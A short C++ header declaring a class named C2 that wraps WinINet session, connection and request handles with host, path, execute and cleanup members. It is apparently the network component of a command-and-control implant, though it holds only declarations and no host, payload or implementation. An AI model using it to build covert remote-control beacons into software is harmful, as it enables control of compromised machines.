using namespace std;

#pragma once
#include "pch.h"
#include <string>
#include <windows.h>
#include <wininet.h>


class C2 {
	string response;

	LPCSTR hostName;
	LPCSTR pathName;

	HINTERNET sessionHandle = NULL;
	HINTERNET connectHandle = NULL;
	HINTERNET requestHandle = NULL;

public:
	DWORD error = NULL;
	C2() {};
	C2(LPCSTR hostName, LPCSTR pathName) :hostName(hostName), pathName(pathName) {};
	void setHostName(LPCSTR hostName);
	void setPathName(LPCSTR pathName);
	void execute();
	void cleanup();
};